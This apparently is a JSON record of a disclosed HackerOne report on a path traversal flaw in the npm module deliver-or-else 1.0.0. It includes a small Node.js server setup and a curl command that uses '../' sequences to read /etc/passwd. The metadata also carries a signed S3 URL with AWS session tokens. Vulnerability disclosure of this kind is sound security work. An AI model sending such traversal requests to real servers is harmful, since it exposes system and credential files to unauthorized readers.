@@ -1,0 +1,119 @@
+{
+  "id": 507310,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MDczMTA=",
+  "url": "https://hackerone.com/reports/507310",
+  "title": "[deliver-or-else] Path Traversal",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2019-03-10T04:49:02.886Z",
+  "submitted_at": "2019-03-10T04:49:02.886Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "johnssimon007",
+    "url": "/johnssimon007",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/NWPHHm8hwLotSetPuMmFkHCa/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-01-29T16:26:38.200Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2019-12-30T16:26:36.700Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I would like to report path traversal in deliver-or-else module\nIt allows an attacker to read system files via path traversal through commandline\n\n# Module\n\n**module name:** deliver-or-else\n**version:** 1.0.0\n**npm page:** https://www.npmjs.com/package/deliver-or-else\n\n## Module Description\n\n> Copy description from npm page\n\n# Vulnerability\n\n## Vulnerability Description\n\nDirectory traversal through the url which doesn't verify the file is from the root directory path.\n\n## Steps To Reproduce:\n\n1.npm i deliver-or-else\n\n2.now create a node.js(test.js) file for starting up a localserver on port 80,which will serve the file on the directory(public) over the web browser depending on the file requested by user through url\n\nhere is code for test.js\n\nconst Deliver = require('deliver-or-else')\nconst path = require('path')\n \n// It is up to you to resolve the document root directory\nconst http = require('http')\nlet deliver = new Deliver(path.join(__dirname, 'public'))\nlet server = http.createServer((req, res) => {\n    /**\n     * The `deliver` method returns a `Promise`, which in turn can be used to \n     * catch any errors (such as a 404). We could also provide a `then` clause \n     * for when it works successfully and a file has been delivered.\n     */\n    deliver.deliver(req, res).catch((err) => {\n        // The err contains information regarding how the `fs.readFile` failed\n        \n        res.statusCode = 404\n        res.setHeader('Content-Type', 'text/plain')\n        res.end('404, no such file.')\n    })\n})\n \nserver.listen(80, '127.0.0.1', function () {\n    console.log('Starting server...')\n})\n\n3.run below command\nnode test.js\nthis will startup the server at port 80 \n\n4.trying to fetch a file outside of \"public\" dir is exempted and shows 404 error\n\n5.this can be bypassed by using curl via commandline by running below command\ncurl -v --path-as-is http://127.0.0.1:8080/node_modules/../../../../../etc/passwd\n\nwhich will return the passwd directory contents\n\n\n# Wrap up\n\n> Select Y or N for the following statements:\n\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N] \n\n> Hunter's comments and funny memes goes here\n\n## Impact\n\nThis vulnerability allows malicious user to read content of any file on the server, which leads to data breach or other attacks.",
+  "weakness": {
+    "id": 19,
+    "name": "Path Traversal"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 438490,
+      "file_name": "Screenshot_from_2019-03-10_10-19-01.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/438/490/97a245cd45453e3d871c96ad73ab819249cd35ef/Screenshot_from_2019-03-10_10-19-01.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2019-03-10_10-19-01.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2019-03-10_10-19-01.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ4B6PJ7G%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T152016Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJGMEQCIAwScZ%2FNQv7lMDvcrNgnaa39OyG1qPwZZxdQk0fRxwDaAiAtlgS9UrY0F8ss6glZb5APM2Ul%2BOewrASjlLZCKXJCJCq7BQjo%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMC2x84%2FTd9E9LDDpTKo8FrVZGYSvHf5%2BgsGvw%2F2bpuitF%2BSxczAdC5MfK8RDpJEuT2xhIOmmpE%2Fz4nF1J3%2F5RBd%2BeO2hGj%2FZ0tzNamT6FOQrQ7MNDyg8xSVmfxpVONGz%2FX%2FwImNhREycOKZtqFNBGC8O2HLsLpNjw%2Fig%2BbcwufClLQCcnVyZrkjbW6Y%2FT9jhrtEFihXMTuwodBO4wBGsysjcbB%2FUHXWGnM6hXJbnLVhsHJrof7SNh%2BlbB%2FDF8ftLSFmxfUhjzkHZtk1K8Fxk18nn9e%2F3NeYpxPq0w9vLeVgdXpedth3GlWrbh5GpJPN%2BOQpktl82LWfxY3yTPi%2By4E7tpwg%2F5EstRpaaRF3EAIqHBTrFOReY1qLXNn5Xh%2BrpG59sVTGUcPqLMGglzh5sNoK0BNXjCIH0p3azU20LLW0wpM%2BZCQ7QvS0zl6dIvpXl%2BGSy5YprKXkZJU9KLgDtXQsnskuydevcMI0RBCIrDBChbJrmfVpDw1yVoUfqqI89wKjpu%2BvwISol%2BBwGWCQFgWBWxe%2Bghjk7I0Xh2rOcF%2BUuDYCVdS%2BIjQ9y0dNsXoiiZdPxsDuGKGOwNcRyKd1n7Lojy3XM7sDHARCe4sEk8A3%2Be0qyTIRNR3HnKkek6GhUiyqsPr2Y0KOc%2FUBOuMlGnu7CidmDqXIxsTgsXKCRyUxNj0Ua9oJRlIk%2FQvrqmJF8fWWzYztxzJ5kpN5YpQq0ub8vP%2FIBjT0gdnoZs9hk0aEIZXODboDo2jXGNv69fiLac%2BrU%2Bth7H8OOUsFPMMPdzkEBNNuzYIFEY9l%2F5SCxqkyCtcxh3t43NwcYM0KcbguFdyUMxXw9ts3mJmQMvIWCfHcn%2FX7t0wpyAbvajLiepP7qpsG%2BPOUoAM2dzvnGjJTDMmv3PBjqyAQZkLS9%2BKAeghgY3zBfOEO3RTV0O4ReAhkSDtYBumYOwB%2FiD%2BM%2B0EhHkD0%2BoRtin5RNIkJvzFYbt30wjlTYpyNOM1tlLGW9t2Xj%2FdxPJu64aqXXBjgdwP9ztMmXXpn8om6AMRTxECj0MJeSqlT14%2FVp9bzjK4tJELUXC1mjIx6c4fsvjyydYMhy%2BjRJliThQAk5ocSYNFmBt71JgUpGVSHCXSg1zGCu%2BH03L5rTCNX80xrQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ad1715720a489dc8d02bc8f4faeeba5be4033fd38e501fc2e901ca2329dd459d",
+      "file_size": 99408,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-01-29T16:26:36.790Z",
+  "allow_singular_disclosure_after": -198024819.74278894,
+  "singular_disclosure_allowed": true,
+  "vote_count": 1,
+  "voters": [
+    "deb0con"
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
